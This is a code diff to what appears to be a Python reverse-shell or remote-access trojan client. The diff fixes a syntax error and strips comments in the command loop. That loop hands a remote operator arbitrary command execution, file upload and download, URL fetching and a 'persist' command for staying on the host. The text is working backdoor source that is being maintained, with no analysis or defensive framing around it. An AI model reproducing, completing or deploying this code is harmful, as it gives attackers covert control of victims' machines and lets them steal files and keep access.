@@ -23,7 +23,7 @@ def Upload(sock, file):
 
   while True:
     d = f.read()
-    if not d
+    if not d:
        break
     Send(sock, d, '')
 
@@ -114,21 +114,13 @@ while True:
       active = True
       Send(s, "\n"+os.getcwd()+">")
 
-    # interactive loop
     while active:
-      # Receive data
       data = Receive(s)
 
-      # think before you type smartass
-      if data == '':
-        time.sleep(0.02)
-
-      # check for quit
       if data == 'exit':
         Send(s, 'exit ok')
         break
 
-      # check for change directory
       elif data.startswith("cd ") == True:
         try:
           os.chdir(data[3:])
@@ -136,31 +128,26 @@ while True:
         except:
           stdoutput = "Error opening directory.\n"
 
-      # check for download
-      elif data.startswith("download") == True:
+      elif data.startswith("download"):
         # Upload the file
         stdoutput = Upload(s, data[9:])
 
-      elif data.startswith("downhttp") == True:
+      elif data.startswith("downhttp"):
         # Download from url
         stdoutput = Downhttp(s, data[9:])
 
-      # check for upload
-      elif data.startswith("upload") == True:
-        # Download the file
+      elif data.startswith("upload"):
         stdoutput = Download(s, data[7:])
 
-      elif data.startswith("persist") == True:
+      elif data.startswith("persist"):
         # Attempt persistence
         if len(data.split(' ')) == 1: stdoutput = Persist(s)
         elif len(data.split(' ')) == 2: stdoutput = Persist(s, data.split(' ')[1])
         elif len(data.split(' ')) == 3: stdoutput = Persist(s, data.split(' ')[1], data.split(' ')[2])
 
       else:
-        # execute command.
         stdoutput = Exec(data)
 
-      # send data
       stdoutput = stdoutput+"\n"+os.getcwd()+">"
       Send(s, stdoutput)
 
